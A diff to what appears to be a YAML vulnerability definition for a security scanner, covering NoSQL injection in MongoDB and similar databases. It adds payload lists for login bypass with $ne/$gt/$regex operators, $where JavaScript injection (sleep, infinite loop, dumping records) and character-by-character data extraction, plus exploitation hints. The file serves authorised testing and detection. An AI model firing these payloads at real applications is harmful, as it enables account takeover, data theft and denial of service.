@@ -1,29 +1,56 @@
-id: NOSQLI
-name: NoSQL Injection
+id: NOSQL
+name: NoSQL Injection (MongoDB and others)
 cwe:
 - CWE-943
 owasp: A03:2021 Injection
 severity_range: High - Critical
-description: Application constructs NoSQL queries from user input without sanitization, allowing data extraction or authentication
-  bypass.
+description: NoSQL databases (MongoDB, CouchDB, Cassandra) accept operator-based queries. Injecting operators bypasses auth
+  or extracts data. Different from SQL injection — uses JSON operators.
 detection:
   payloads:
-    mongodb_json:
+    mongodb_operators:
     - '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
-    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
-    - '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}'
-    - '{"$where": "sleep(5000)"}'
-    mongodb_url:
+    - '{"username": "admin", "password": {"$gt": ""}}'
+    - '{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}'
+    - '{"username": "admin", "password": {"$where": "sleep(5000) || true"}}'
+    - '{"$where": "this.password == this.username"}'
+    json_to_array_syntax:
     - username[$ne]=&password[$ne]=
     - username[$gt]=&password[$gt]=
-    - username[$regex]=^admin&password[$ne]=
-  strategy:
-  - 1. Test JSON body parameters with MongoDB operators ($ne, $gt, $regex, $where)
-  - '2. Test URL parameters with array syntax: param[$ne]=value'
-  - 3. Test for JavaScript injection via $where operator
-  - 4. Test for blind NoSQL injection via $regex with timing
-  - 5. Check for data extraction via $regex character-by-character
-evidence_needed: Authentication bypass or data extraction via NoSQL operators
+    - username[$regex]=^admin&password[$regex]=.*
+    javascript_injection:
+    - '"; return JSON.stringify(this); //'
+    - '"; sleep(5000); //'
+    - '"; while(1); //'
+  attack_classes:
+    auth_bypass:
+      description: Bypass login with $ne operator
+      payload: '{"username":"admin","password":{"$ne":""}}'
+      severity: critical
+    boolean_blind_extraction:
+      description: Use $regex to extract char by char
+      payload: '{"username":"admin","password":{"$regex":"^a.*"}}'
+      severity: high
+    javascript_injection_where:
+      description: $where allows JS execution server-side
+      payload: '{"$where":"this.username == this.password"}'
+      severity: critical
+    time_based_blind:
+      description: $where with sleep loop
+      payload: '{"$where":"sleep(5000) || true"}'
+      severity: high
+exploitation:
+  data_dump: Use $regex to extract sensitive collections character by character
+  auth_bypass_full: $ne or $gt or $exists:true on password field
+ai_research_hints:
+- MEAN/MERN stack apps are primary NoSQL injection targets
+- Check if app accepts JSON body — that's where operator injection lives
+- URL-encoded array syntax (param[$ne]=) works on Express apps
+- $where with JS is the most dangerous — full server-side execution
+- CouchDB has its own injection patterns via map/reduce
+tools:
+- NoSQLMap
+- Burp Active Scan
 references:
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
 - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+- https://github.com/cr0hn/nosqlinjection_wordlists
